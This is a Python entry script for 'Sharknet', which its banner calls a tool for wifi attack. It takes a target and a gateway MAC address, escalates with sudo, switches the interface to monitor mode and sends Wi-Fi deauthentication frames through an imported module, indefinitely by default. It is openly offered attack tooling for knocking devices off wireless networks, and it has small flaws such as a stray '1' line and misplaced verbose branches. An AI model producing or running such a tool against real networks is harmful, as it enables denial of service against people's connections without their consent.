from scapy.all import *
from colorama import Fore
import os
import sys
from sudo import sudo
from attack import deauth
from interface import interfacemonitoring

1

print (Fore.GREEN,'''
   .               .    
 .´  ·  .     .  ·  `.  Sharknet 2.6.0
 :  :  :  (¯)  :  :  :  a tool for wifi attack
 `.  ·  ` /¯\ ´  ·  .´  
   `     /¯¯¯\     ´    https://github.com/amirali115a/Sharknet

                                    
''')


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="A python script for sending deauthentication frames")
    parser.add_argument("target", help="Target MAC address to deauthenticate.")
    parser.add_argument("gateway", help="Gateway MAC address that target is authenticated with")
    parser.add_argument("-c" , "--count", help="number of deauthentication frames to send, specify 0 to keep sending infinitely, default is 0", default=0)
    parser.add_argument("--interval", help="The sending frequency between two frames sent, default is 100ms", default=0.1)
    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0mon'", default="wlan0mon")
    parser.add_argument("-v", "--verbose", help="wether to print messages", action="store_true")

    args = parser.parse_args()
    target = args.target
    gateway = args.gateway
    count = int(args.count)
    interval = float(args.interval)
    iface = args.iface
    verbose = args.verbose
    sudo.sudo()
    if not iface.endswith("mon"):
        print(Fore.RED,'interface not monitoring')
        interfacemonitoring.interface(iface)
        iface2  = f'{iface}mon'


        if count == 0:
      
         loop = 1
         count = None
        else:
         loop = 0

        if verbose:
         if count:
            print(Fore.GREEN,f"[+] Sending {count} frames every {interval}s...")
        else:
            print(Fore.GREEN,f"[+] Sending frames every {interval}s for ever...")

        deauth.deauth(target, gateway, interval, count, loop, iface2, verbose)

    else:
        if count == 0:
      
           loop = 1
           count = None
        else:
         loop = 0

        if verbose:
         if count:
            print(Fore.GREEN,f"[+] Sending {count} frames every {interval}s...")
        else:
            print(Fore.GREEN,f"[+] Sending frames every {interval}s for ever...")

        deauth.deauth(target, gateway, interval, count, loop, iface, verbose)